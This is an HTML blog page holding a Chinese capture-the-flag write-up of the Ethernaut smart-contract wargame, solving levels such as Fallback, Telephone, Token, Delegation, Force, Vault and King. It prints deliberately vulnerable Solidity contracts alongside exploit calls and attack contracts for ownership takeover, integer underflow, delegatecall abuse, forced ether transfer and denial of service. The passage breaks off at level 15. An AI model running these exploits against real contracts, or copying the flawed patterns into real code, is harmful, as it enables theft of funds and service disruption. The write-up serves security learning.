@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by Youssef Raafat
+  Free for personal and commercial use under the MIT license
+  https://github.com/YoussefRaafatNasry/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content=""一只猫～"">
+
+  <title>dyf's blog</title>
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
+  
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">
+
+  <!-- Mathjax for latex -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+  <!-- comment system -->
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+</head>
+
+
+<body class="d-flex flex-column h-100">
+
+  <main class="flex-shrink-0 container mt-5">
+  <nav class="navbar navbar-expand-lg navbar-light">
+
+  <a class="navbar-brand" href="/"><h5><b>dyf's blog</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/link/">Link</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+    </div>
+  </div>
+
+</nav>
+  <div class="col-lg-10 mx-auto mt-5 post">
+  <h1><b>Ethernaut WriteUp</b></h1>
+
+<p class="post-metadata text-muted">
+  26 March 2019 -
+  <b>13 mins read time</b>
+
+  <br>Tags:
+  
+  <a class="text-decoration-none no-underline" href="/blog/tags#solidiry">
+    <span class="tag badge badge-pill text-primary border border-primary">solidiry</span>
+  </a>
+  
+  <a class="text-decoration-none no-underline" href="/blog/tags#security">
+    <span class="tag badge badge-pill text-primary border border-primary">security</span>
+  </a>
+  </p>
+
+<h3 id="很好玩的合约游戏">很好玩的合约游戏</h3>
+
+<hr />
+
+<h4 id="1-fallback">1. Fallback</h4>
+<blockquote>
+  <p><strong>Target</strong>: claim ownership of the contract</p>
+</blockquote>
+
+<p>  这道题是考察<strong>fallback</strong>函数的奇妙(sb)用法，他的目的应该是处理异常用的，但是效果其实有点鸡肋…</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">'</span><span class="s1">zeppelin-solidity/contracts/ownership/Ownable.sol</span><span class="dl">'</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Fallback</span> <span class="nx">is</span> <span class="nx">Ownable</span> <span class="p">{</span>
+
+  <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">contributions</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">Fallback</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">contribute</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&lt;</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
+    <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span> <span class="p">{</span>
+      <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">getContribution</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
+    <span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">balance</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span><span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>  在这里，我们只需要 <strong>我 秦始皇 打钱</strong> 就可以实现fallback()的调用：</p>
+
+<blockquote>
+  <p>contract.sendTransaction({value:1});</p>
+</blockquote>
+
+<p>  智能合约的梗是真他喵的多 哈哈哈哈哈</p>
+
+<hr />
+
+<h4 id="2-fallout">2. Fallout</h4>
+
+<blockquote>
+  <p><strong>Target</strong>: Claim ownership of the contract</p>
+</blockquote>
+
+<p>  这道题的出题人是真的欠揍，马德，完全是考眼力：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">'</span><span class="s1">zeppelin-solidity/contracts/ownership/Ownable.sol</span><span class="dl">'</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Fallout</span> <span class="nx">is</span> <span class="nx">Ownable</span> <span class="p">{</span>
+
+  <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">allocations</span><span class="p">;</span>
+
+  <span class="cm">/* constructor */</span>
+  <span class="kd">function</span> <span class="nx">Fal1out</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="nx">allocations</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">allocate</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">sendAllocation</span><span class="p">(</span><span class="nx">address</span> <span class="nx">allocator</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nx">allocator</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]);</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">collectAllocations</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
+    <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">balance</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">allocatorBalance</span><span class="p">(</span><span class="nx">address</span> <span class="nx">allocator</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>  看到没有第9行正儿八经的写着<strong>constructor</strong> 喵？定睛一看构造个瓜皮的函数，<strong>Fal1out()</strong> 这里不要被骗了，直接调用就可以了。</p>
+
+<blockquote>
+  <p>contract.Fal1out();</p>
+</blockquote>
+
+<hr />
+
+<h4 id="3-coin-flip">3. Coin Flip</h4>
+
+<hr />
+
+<h4 id="4-telephone">4. Telephone</h4>
+
+<blockquote>
+  <p><strong>Target</strong>: 将owner变为自己</p>
+</blockquote>
+
+<p>  本题主要考察的是只能合约中tx.origin与msg.sender的区别，tx.origin是交易发起人，msg.sender是合约的上层调用地址。因此只需要用新合约包装一下地址就好了。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="nx">contract</span> <span class="nx">Telephone</span> <span class="p">{</span>
+
+    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
+
+    <span class="kd">function</span> <span class="nx">Telephone</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">changeOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">attack</span><span class="p">{</span>
+
+    <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x811cb74F2FC520c64f7B44ac90d056c744f0Cf4d</span><span class="p">;</span>
+    <span class="nx">Telephone</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">Telephone</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
+    
+    <span class="kd">function</span> <span class="nx">hit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+            <span class="nx">Telephone</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">Telephone</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
+            <span class="nx">c</span><span class="p">.</span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+      <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h4 id="5-token">5. Token</h4>
+
+<blockquote>
+  <p><strong>Target</strong>: 将owner变为自己</p>
+</blockquote>
+
+<p>  这里主要考察uint的无符号整数的下溢,当uint为负数时，根据二进制的无符号表示法，此时数会变成一个极大的数，比如:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">uint</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="nx">a</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>           <span class="c1">//此时a为ffffffff</span>
+
+</code></pre></div></div>
+
+<p>  这在pwn中十分常见，因此我们可以构造payload，即:</p>
+
+<blockquote>
+  <p>contract.transfer(yourAddress,21);</p>
+</blockquote>
+
+<p>  或者构造攻击合约：</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Token</span> <span class="p">{</span>
+
+    <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">balances</span><span class="p">;</span>
+    <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">totalSupply</span><span class="p">;</span>
+
+    <span class="kd">function</span> <span class="nx">Token</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">totalSupply</span> <span class="o">=</span> <span class="nx">_initialSupply</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">_value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-</span> <span class="nx">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_value</span><span class="p">;</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">_value</span><span class="p">;</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span> <span class="nx">balance</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_owner</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">attack</span><span class="p">{</span>
+    <span class="nx">address</span> <span class="nx">Tokens</span> <span class="o">=</span> <span class="mh">0x0c65c7ec30d5d856958707fc8b958302ae689b49</span><span class="p">;</span>
+    <span class="nx">Token</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">Token</span><span class="p">(</span><span class="nx">Tokens</span><span class="p">);</span>
+    <span class="kd">function</span> <span class="nx">hit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="mi">21</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+<hr />
+
+<h4 id="6-delegation">6. Delegation</h4>
+
+<blockquote>
+  <p><strong>Target</strong>: 将owner变为自己</p>
+</blockquote>
+
+<p>  这道题主要考察的是delegatecall()相关的知识，<strong>delegatecall()</strong> 与 <strong>call()</strong> 的区别是两者的上下文不同，delegatecall()的上下文是调用方，而call()函数的上下文则是实例本身。</p>
+
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/eth_writeUp0.png?raw=true" alt="delegatecall()" /></p>
+
+<p>  我们来看一下合约代码：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Delegate</span> <span class="p">{</span>
+
+  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">Delegate</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">Delegation</span> <span class="p">{</span>
+
+  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
+  <span class="nx">Delegate</span> <span class="nx">delegate</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">Delegation</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_delegateAddress</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">delegate</span> <span class="o">=</span> <span class="nx">Delegate</span><span class="p">(</span><span class="nx">_delegateAddress</span><span class="p">);</span>
+    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">delegate</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">this</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>  我们可以看到<strong>Delegation</strong>的<strong>fallback</strong>函数中存在<strong>delegatecall</strong>而且其中的参数可以修改，这个时候我们可以直接调用<strong>Delegate</strong>实例的<strong>pwn()</strong>函数，payload如下：</p>
+
+<blockquote>
+  <p>contract.sendTransaction({data:web3.sha3(“pwn()”)})</p>
+</blockquote>
+
+<p>  这个时候我们可以看到实例直接调用了非<strong>public</strong>的<strong>pwn</strong>函数,我们就实现了修改owner的操作。</p>
+
+<hr />
+
+<h4 id="7-force">7. Force</h4>
+
+<p>  这一题是要你给这个合约转钱，这里除了一只噬元兽什么也没有…乍一看挺懵逼的</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Force</span> <span class="p">{</span><span class="cm">/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)         //马德 为什么这个猫变形了...
+
+*/</span><span class="p">}</span>
+</code></pre></div></div>
+<p>  要想给一个地址强行转钱，我们可以让一个合约自杀，然后钱就会被强行转入别的账户而且不能拒绝。所以我们就可以写个合约，随便打点钱，然后让他当场暴毙…好生刺激。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Force</span><span class="p">{</span>
+
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">payload</span><span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">payload</span><span class="p">()</span> <span class="nx">payable</span><span class="p">{}</span>
+    <span class="nx">address</span> <span class="nx">addr_force</span> <span class="o">=</span> <span class="mh">0x0ad6047bf65c599bf68fbbc0372c3923280f2a66</span><span class="p">;</span>
+    <span class="kd">function</span> <span class="nx">hit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">addr_force</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>  这样一来，一执行hit()函数payload就凉凉，然后钱就打到了Force里面了，有没有一种舔狗的感觉…</p>
+
+<hr />
+
+<h4 id="8-vault">8. Vault</h4>
+
+<blockquote>
+  <p><strong>Target</strong>: 解锁</p>
+</blockquote>
+
+<p>  这道题主要考察了如何通过<strong>web3</strong>的<strong>web3.eth.getStorageAt()</strong>接口来查看区块上的信息。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Vault</span> <span class="p">{</span>
+  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">locked</span><span class="p">;</span>
+  <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">password</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">Vault</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nx">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">password</span> <span class="o">=</span> <span class="nx">_password</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">password</span> <span class="o">==</span> <span class="nx">_password</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>  我们只需要通过<strong>unlock()</strong>函数就能修改locked的值，getStorageAt()的用法如下：</p>
+
+<blockquote>
+  <p>web3.eth.getStorageAt(addressHexString, position [, defaultBlock] [, callback])</p>
+</blockquote>
+
+<p>  我们需要使用一个回调函数来打印出相关数据：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">){</span>
+    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">toAscii</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
+    <span class="nx">alert</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
+        <span class="p">});</span>
+</code></pre></div></div>
+
+<hr />
+
+<h4 id="9-king">9. King</h4>
+
+<blockquote>
+  <p><strong>Target</strong>: Be a king forever!!</p>
+</blockquote>
+
+<p>  先放源码：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">'</span><span class="s1">zeppelin-solidity/contracts/ownership/Ownable.sol</span><span class="dl">'</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">King</span> <span class="nx">is</span> <span class="nx">Ownable</span> <span class="p">{</span>
+
+  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">king</span><span class="p">;</span>
+  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">prize</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">King</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">prize</span> <span class="o">||</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
+    <span class="nx">king</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
+    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>  这个题目有点坑爹，他原本的目的是让你进行一次<strong>ddos</strong>攻击,在之前的版本中，我们可以使用</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span> <span class="nx">require</span><span class="p">()</span>
+
+<span class="mi">2</span><span class="p">.</span> <span class="nx">revert</span><span class="p">()</span>
+
+<span class="mi">3</span><span class="p">.</span> <span class="nx">assert</span><span class="p">()</span>
+</code></pre></div></div>
+<p>  这三个函数主动抛出错误，这样一样就可以阻止<strong>transfer()</strong>的进行，但是在实施的时候我们发现这三个函数并没有阻止交易的进行，所以我们决定直接放弃编写fallback()从而进行拒绝服务攻击。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">fuck</span><span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">fuck</span><span class="p">()</span> <span class="nx">payable</span><span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">king_addr</span> <span class="o">=</span> <span class="mh">0xc48b3899a3a594b170404855De1B0bDA2d0aec1c</span><span class="p">;</span>
+        <span class="nx">king_addr</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="mf">1.01</span> <span class="nx">ether</span><span class="p">)();</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nx">gg</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<blockquote>
+  <p>gg()完全是为了以防钱提不出来，留个后手。</p>
+</blockquote>
+
+<hr />
+
+<h4 id="15naught-coin">15.Naught Coin</h4>
+
+<blockquote>
+  <p><strong>Target</strong>:取出合约中player所对应的balances</p>
+</blockquote>
+
+<p>  这里的balances实际上是一个token，作者重写了transfer()方法，但是他的源码不见了，我在github上找到了之前的版本：</p>
+
